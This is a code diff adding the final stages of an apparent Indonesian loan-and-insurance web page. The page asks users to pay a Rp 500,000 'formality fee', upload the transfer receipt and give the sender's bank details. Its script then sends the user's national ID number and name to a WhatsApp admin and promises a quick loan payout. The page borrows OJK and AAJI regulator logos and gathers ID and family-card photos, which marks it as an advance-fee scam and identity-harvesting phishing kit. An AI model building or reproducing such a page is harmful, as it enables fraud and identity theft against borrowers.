+                Pastikan nominal transfer sesuai sampai 3 digit terakhir jika ada kode unik. Simpan bukti struk transfer atau screenshot layar handphone Anda untuk diunggah pada tahap berikutnya agar verifikasi instan diterima sistem.
+            </div>
+
+            <button onclick="navigate('upload-proof-section')" class="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/25 transition active:scale-[0.98]">
+                Saya Sudah Selesai Transfer
+            </button>
+        </section>
+
+        <!-- ============ STAGE 7: UPLOAD PROOF ============ -->
+        <section id="upload-proof-section" class="section hidden animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-blue-100 text-primary font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2">Konfirmasi Akhir</span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Unggah Bukti Transfer & Selesaikan</h2>
+                <p class="text-xs sm:text-sm text-slate-500 mt-1">Kirimkan bukti struk pembayaran agar sistem dapat langsung mengecek dan mencairkan dana pinjaman Anda hari ini.</p>
+            </div>
+
+            <div class="space-y-4 mb-6">
+                <div class="dropzone border-2 border-dashed border-slate-300 rounded-2xl p-5 text-center bg-slate-50 hover:bg-blue-50/50 hover:border-primary transition cursor-pointer relative" onclick="document.getElementById('proofPhoto').click()">
+                    <span class="text-xs font-bold text-primary block mb-1">Upload Foto Bukti Transfer / Struk Resmi</span>
+                    <span class="text-xs text-slate-500 font-medium block truncate" id="proofPhotoName">Ketuk untuk memilih foto struk transfer</span>
+                    <input type="file" id="proofPhoto" accept="image/png,image/jpeg,image/jpg,image/webp" class="absolute inset-0 opacity-0 cursor-pointer" onchange="updateFileName(this, 'proofPhotoName')">
+                </div>
+
+                <div class="form-group" id="group-sender-name">
+                    <label for="senderName" class="block text-xs font-bold text-slate-800 mb-1.5">Nama Pemilik Rekening Asal (Pengirim):</label>
+                    <input type="text" id="senderName" placeholder="Contoh: Budi Santoso" aria-describedby="senderNameError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" oninput="validateInputRealtime('senderName', 'group-sender-name', val => val.trim().length >= 3)">
+                    <span id="senderNameError" class="text-xs text-red-600 mt-1 hidden font-medium">Nama pengirim wajib diisi sesuai rekening bank.</span>
+                </div>
+
+                <div class="form-group" id="group-sender-bank">
+                    <label for="senderBank" class="block text-xs font-bold text-slate-800 mb-1.5">Bank Asal Pengirim:</label>
+                    <select id="senderBank" aria-describedby="senderBankError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" onchange="validateInputRealtime('senderBank', 'group-sender-bank', val => val !== '')">
+                        <option value="" disabled selected>Pilih Bank / E-Wallet Anda</option>
+                        <option value="BCA">BCA</option>
+                        <option value="Mandiri">Mandiri</option>
+                        <option value="BRI">BRI</option>
+                        <option value="BNI">BNI</option>
+                        <option value="BSI">BSI / Bank Syariah</option>
+                        <option value="Lainnya">Bank Lain / E-Wallet (OVO/DANA/GoPay)</option>
+                    </select>
+                    <span id="senderBankError" class="text-xs text-red-600 mt-1 hidden font-medium">Silakan pilih bank asal pengirim.</span>
+                </div>
+            </div>
+
+            <button id="finalSubmitBtn" onclick="finalSubmit()" class="w-full bg-accent-gold hover:bg-amber-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-amber-500/25 transition active:scale-[0.98]">
+                Konfirmasi & Cairkan Dana Sekarang
+            </button>
+        </section>
+
+        <!-- ============ STAGE 8: SUCCESS ============ -->
+        <section id="success-section" class="section hidden animate-fade text-center py-6">
+            <div class="w-20 h-20 bg-emerald-100 text-accent-green rounded-full flex items-center justify-center mx-auto mb-4 shadow-inner">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
+            </div>
+            <h2 class="text-2xl font-black text-slate-900 mb-2">Verifikasi Data Berhasil!</h2>
+            <p class="text-sm font-semibold text-emerald-700 mb-4">Bukti transfer dan dokumen Anda telah terekam aman di sistem.</p>
+
+            <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 mb-6 text-xs text-slate-600 leading-relaxed text-left">
+                <strong class="font-bold text-slate-800 block mb-1">Status Pengajuan Saat Ini:</strong>
+                Polis asuransi jiwa Anda sedang dalam antrean penerbitan elektronik. Tim verifikasi perbankan akan segera memproses pencairan dana pinjaman ke rekening Anda dalam waktu 15 - 30 menit ke depan. Anda juga akan dihubungi oleh admin resmi via WhatsApp.
+            </div>
+
+            <button onclick="location.reload()" class="w-full bg-primary hover:bg-primary-dark text-white font-bold py-3.5 px-6 rounded-2xl transition">
+                Selesai & Keluar
+            </button>
+        </section>
+
+    </main>
+
+    <!-- ================= FOOTER ================= -->
+    <footer class="flex flex-col items-center justify-center gap-3 py-4 px-6 bg-slate-50 border-t border-slate-200 text-center">
+        <div class="flex items-center justify-center gap-6 opacity-70">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/OJK_Logo.png" alt="OJK" class="h-6 object-contain grayscale hover:grayscale-0 transition">
+            <img src="https://i.ibb.co.com/RpWRhbfH/header-logo-aaji.png" alt="AAJI" class="h-6 object-contain grayscale hover:grayscale-0 transition">
+        </div>
+        <span class="text-[11px] text-slate-400 font-medium">© 2026 PT Asuransi Sejahtera Tbk. Seluruh Hak Cipta Dilindungi Undang-Undang.</span>
+    </footer>
+
+</div>
+
+<!-- Toast -->
+<div id="toast-container" role="region" aria-live="polite" aria-label="Notifikasi"></div>
+
+<!-- Loader -->
+<div id="loader" role="status" aria-live="assertive"
+    class="fixed inset-0 bg-white/85 backdrop-blur-md z-50 hidden flex-col items-center justify-center opacity-0 transition-opacity duration-300">
+    <div class="w-12 h-12 border-4 border-slate-200 border-t-primary rounded-full animate-spin mb-4"></div>
+    <span class="text-sm font-bold text-primary-dark tracking-wide">Memproses Transaksi Aman...</span>
+    <span class="text-[11px] text-slate-400 mt-1">Harap jangan menutup halaman ini</span>
+</div>
+
+<script>
+/* ============================================================
+   KONFIGURASI
+============================================================ */
+const WA_ADMIN_NUMBER = "6281234567890";
+const STEPS = {
+    'intro-section':               { step: 0, label: 'Pengantar' },
+    'policy-form-section':         { step: 1, label: 'Data Diri' },
+    'verification-section':        { step: 2, label: 'Dokumen' },
+    'method-section':              { step: 3, label: 'Metode' },
+    'offline-instruction-section': { step: 4, label: 'Instruksi Kantor' },
+    'premium-prompt-section':      { step: 4, label: 'Validasi Biaya' },
+    'payment-page-section':        { step: 5, label: 'Pembayaran' },
+    'upload-proof-section':        { step: 6, label: 'Konfirmasi' },
+    'success-section':             { step: 6, label: 'Selesai' },
+};
+let historyStack = [];
+let currentSection = 'intro-section';
+let isSubmitting = false;
+
+/* ============================================================
+   TOAST
+============================================================ */
+function showToast(message, type = 'info', duration = 3800) {
+    const container = document.getElementById('toast-container');
+    const colors = {
+        info:    { bg: 'bg-blue-50',    border: 'border-blue-300',    text: 'text-blue-900',    icon: 'M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z' },
+        success: { bg: 'bg-emerald-50', border: 'border-emerald-300', text: 'text-emerald-900', icon: 'M5 13l4 4L19 7' },
+        error:   { bg: 'bg-red-50',     border: 'border-red-300',     text: 'text-red-900',     icon: 'M6 18L18 6M6 6l12 12' },
+        warning: { bg: 'bg-amber-50',   border: 'border-amber-300',   text: 'text-amber-900',   icon: 'M12 9v2m0 4h.01M10.29 3.86l-8.02 13.9A1 1 0 003.14 19h17.72a1 1 0 00.86-1.5L13.71 3.86a1 1 0 00-1.73 0z' },
+    };
+    const c = colors[type] || colors.info;
+    const el = document.createElement('div');
+    el.className = `toast ${c.bg} ${c.border} ${c.text} border rounded-xl px-4 py-3 shadow-lg flex items-start gap-2.5 text-sm font-medium`;
+    el.innerHTML = `<svg class="w-5 h-5 shrink-0 mt-0.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="${c.icon}"/></svg><span>${message}</span>`;
+    container.appendChild(el);
+    setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateY(-12px)'; el.style.transition = 'all .3s'; }, duration - 300);
+    setTimeout(() => el.remove(), duration);
+}
+
+/* ============================================================
+   NAVIGASI
+============================================================ */
+function navigate(targetId) {
+    if (currentSection === targetId) return;
+    historyStack.push(currentSection);
+    applyNavigation(targetId);
+}
+
+function goBack() {
+    if (historyStack.length === 0) return;
+    applyNavigation(historyStack.pop());
+}
+
+function applyNavigation(targetId) {
+    const loader = document.getElementById('loader');
+    loader.style.display = 'flex';
+    requestAnimationFrame(() => loader.style.opacity = '1');
+
+    setTimeout(() => {
+        document.querySelectorAll('.section').forEach(sec => sec.classList.add('hidden'));
+        const targetEl = document.getElementById(targetId);
+        if (targetEl) {
+            targetEl.classList.remove('hidden');
+            targetEl.classList.add('animate-fade');
+        }
+        currentSection = targetId;
+
+        const backBtn = document.getElementById('backBtn');
+        const showBack = historyStack.length > 0 && !['intro-section', 'success-section'].includes(targetId);
+        backBtn.classList.toggle('hidden', !showBack);
+        backBtn.classList.toggle('flex', showBack);
+
+        const stepInfo = STEPS[targetId] || { step: 0 };
+        const pct = Math.min(100, (stepInfo.step / 6) * 100);
+        document.getElementById('progressFill').style.width = pct + '%';
+
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        loader.style.opacity = '0';
+        setTimeout(() => loader.style.display = 'none', 300);
+    }, 380);
+}
+
+/* ============================================================
+   VALIDASI
+============================================================ */
+function validateInputRealtime(elementId, groupId, conditionFn) {
+    const el = document.getElementById(elementId);
+    const group = document.getElementById(groupId);
+    if (!group || !el) return true;
+    const errorMsg = group.querySelector('.text-red-600');
+    const valid = conditionFn(el.value);
+    group.classList.toggle('error', !valid);
+    el.classList.toggle('border-red-500', !valid);
+    el.classList.toggle('bg-red-50', !valid);
+    el.setAttribute('aria-invalid', String(!valid));
+    if (errorMsg) errorMsg.classList.toggle('hidden', valid);
+    return valid;
+}
+
+function focusFirstError() {
+    const err = document.querySelector('.section:not(.hidden) .error input, .section:not(.hidden) .error textarea, .section:not(.hidden) .error select');
+    if (err) { err.scrollIntoView({ behavior: 'smooth', block: 'center' }); err.focus({ preventScroll: true }); }
+}
+
+/* ============================================================
+   FORMAT & UTILITAS
+============================================================ */
+function formatRupiah(input) {
+    const raw = input.value.replace(/[^,\d]/g, '');
+    if (!raw) { input.value = ''; return; }
+    const split = raw.split(',');
+    const sisa = split[0].length % 3;
+    let rupiah = split[0].substr(0, sisa);
+    const ribuan = split[0].substr(sisa).match(/\d{3}/gi);
+    if (ribuan) { rupiah += (sisa ? '.' : '') + ribuan.join('.'); }
+    input.value = 'Rp ' + rupiah;
+}
+
+function updateFileName(inputElement, labelId) {
+    const label = document.getElementById(labelId);
+    if (!label) return;
+    if (inputElement.files && inputElement.files.length) {
+        const file = inputElement.files[0];
+        if (file.size > 5 * 1024 * 1024) {
+            showToast('Ukuran file melebihi 5MB. Silakan pilih foto lain.', 'error');
+            inputElement.value = '';
+            label.textContent = "Ketuk untuk memilih foto";
+            label.className = "text-xs text-slate-500 font-medium block truncate";
+            return;
+        }
+        if (!file.type.startsWith('image/')) {
+            showToast('Format file harus berupa gambar (JPG/PNG).', 'error');
+            inputElement.value = '';
+            return;
+        }
+        label.textContent = "✓ " + file.name;
+        label.className = "text-xs text-emerald-700 font-semibold block truncate";
+        showToast('Foto berhasil diunggah.', 'success', 2200);
+    }
+}
+
+function copyVA() {
+    const text = document.getElementById('vaNumber').textContent.replace(/\s+/g, '');
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(() => showToast('Nomor VA berhasil disalin.', 'success', 2000))
+            .catch(() => fallbackCopy(text));
+    } else {
+        fallbackCopy(text);
+    }
+}
+function fallbackCopy(text) {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); showToast('Nomor VA berhasil disalin.', 'success', 2000); }
+    catch (e) { showToast('Gagal menyalin. Salin manual: ' + text, 'warning'); }
+    document.body.removeChild(ta);
+}
+
+/* ============================================================
+   SUBMIT STAGES
+============================================================ */
+function validateForm1() {
+    const ok = [
+        validateInputRealtime('ktpNumber', 'group-ktp', v => /^\d{16}$/.test(v)),
+        validateInputRealtime('fullName', 'group-name', v => v.trim().length >= 3),
+        validateInputRealtime('phoneNumber', 'group-phone', v => /^0\d{8,13}$/.test(v)),
+        validateInputRealtime('address', 'group-address', v => v.trim().length >= 10),
+        validateInputRealtime('coverageAmount', 'group-coverage', v => v.replace(/\D/g,'').length >= 6),
+        validateInputRealtime('beneficiary', 'group-beneficiary', v => v.trim().length >= 3),
+        validateInputRealtime('relation', 'group-relation', v => v !== ''),
+    ].every(Boolean);
+    if (!ok) { showToast('Mohon lengkapi seluruh data dengan benar.', 'error'); focusFirstError(); return; }
+    showToast('Data diri tersimpan.', 'success', 2200);
+    navigate('verification-section');
+}
+
+function validateForm2() {
+    const required = [
+        ['ktpPhoto', 'Foto KTP Peminjam'],
+        ['saksiKtpPhoto', 'Foto KTP Saksi'],
+        ['kkPhoto', 'Foto Kartu Keluarga'],
+    ];
+    for (const [id, label] of required) {
+        const el = document.getElementById(id);
+        if (!el.files.length) {
+            showToast(`${label} wajib diunggah.`, 'error');
+            return;
+        }
+    }
+    navigate('method-section');
+}
+
+function selectMethod(method) {
+    const online = document.getElementById('cardOnline');
+    const offline = document.getElementById('cardOffline');
+    [online, offline].forEach(c => c.classList.remove('border-primary', 'bg-blue-50/50', 'ring-2', 'ring-blue-200'));
+    document.querySelectorAll('.method-check').forEach(c => c.remove());
+    const target = method === 'online' ? online : offline;
+    target.classList.add('border-primary', 'bg-blue-50/50', 'ring-2', 'ring-blue-200');
+    target.insertAdjacentHTML('afterbegin',
+        `<div class="method-check absolute top-3 right-3 w-6 h-6 rounded-full bg-primary text-white flex items-center justify-center">
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
+        </div>`);
+    document.getElementById('selectedMethodValue').value = method;
+}
+
+function processMethod() {
+    const m = document.getElementById('selectedMethodValue').value;
+    if (m === 'online') navigate('premium-prompt-section');
+    else if (m === 'offline') navigate('offline-instruction-section');
+    else showToast('Silakan pilih salah satu jalur penyelesaian.', 'warning');
+}
+
+/* ============================================================
+   FINAL SUBMIT
+============================================================ */
+function finalSubmit() {
+    if (isSubmitting) return;
+    if (!document.getElementById('proofPhoto').files.length) {
+        showToast('Bukti transfer wajib diunggah.', 'error'); return;
+    }
+    const senderName = document.getElementById('senderName').value.trim();
+    const senderBank = document.getElementById('senderBank').value;
+    if (senderName.length < 3) { showToast('Nama pengirim tidak valid.', 'error'); focusFirstError(); return; }
+    if (!senderBank) { showToast('Pilih bank asal pengirim.', 'error'); return; }
+
+    isSubmitting = true;
+    const btn = document.getElementById('finalSubmitBtn');
+    if (btn) { btn.disabled = true; btn.classList.add('opacity-60', 'cursor-not-allowed'); btn.textContent = 'Mengirim data...'; }
+
+    const ktp = document.getElementById('ktpNumber').value;
+    const nama = document.getElementById('fullName').value;
+    const safe = s => String(s).replace(/[<>]/g, '');
+
+    const waText =
+        `*KONFIRMASI PENCAIRAN & POLIS (ONLINE)*%0A%0A` +
+        `*Data Nasabah:*%0A- NIK: ${safe(ktp)}%0A- Nama: ${safe(nama)}%0A%0A` +
+        `*Data Transfer Formalitas:*%0A- Nominal: Rp 500.000%0A- Bank Pengirim: ${safe(senderBank)}%0A- Nama Pengirim: ${safe(senderName)}%0A%0A` +
+        `_Admin, saya telah menyelesaikan pembayaran biaya formalitas asuransi. Mohon segera verifikasi dan proses pencairan dana pinjaman._`;
+
+    setTimeout(() => {
+        try { window.open(`https://wa.me/${WA_ADMIN_NUMBER}?text=${waText}`, '_blank'); } catch (e) {}
+        navigate('success-section');
+        showToast('Pengajuan berhasil dikirim!', 'success');
+        isSubmitting = false;
+        if (btn) { btn.disabled = false; btn.classList.remove('opacity-60', 'cursor-not-allowed'); btn.textContent = 'Konfirmasi & Cairkan Dana Sekarang'; }
+    }, 600);
+}
+
+/* ============================================================
+   DRAG & DROP UPLOAD
+============================================================ */
+document.querySelectorAll('input[type=file]').forEach(inp => {
+    const zone = inp.closest('.dropzone') || inp.closest('div[class*="border-dashed"]');
+    if (!zone) return;
+    ['dragover', 'dragenter'].forEach(ev => zone.addEventListener(ev, e => { e.preventDefault(); zone.classList.add('dragover'); }));
+    ['dragleave', 'drop'].forEach(ev => zone.addEventListener(ev, e => { e.preventDefault(); zone.classList.remove('dragover'); }));
+    zone.addEventListener('drop', e => {
+        if (e.dataTransfer.files.length) {
+            inp.files = e.dataTransfer.files;
+            updateFileName(inp, inp.id + 'Name');
+        }
+    });
+});
+
+/* ============================================================
+   PROTEKSI & INIT
+============================================================ */
+// Cegah reload tanpa sengaja jika sudah masuk step lanjutan
+window.addEventListener('beforeunload', (e) => {
+    if (!['intro-section', 'success-section'].includes(currentSection)) {
+        e.preventDefault();
+        e.returnValue = '';
+    }
+});
+
+// Render progress awal
+document.getElementById('progressFill').style.width = '0%';
+</script>
+</body>
+</html>
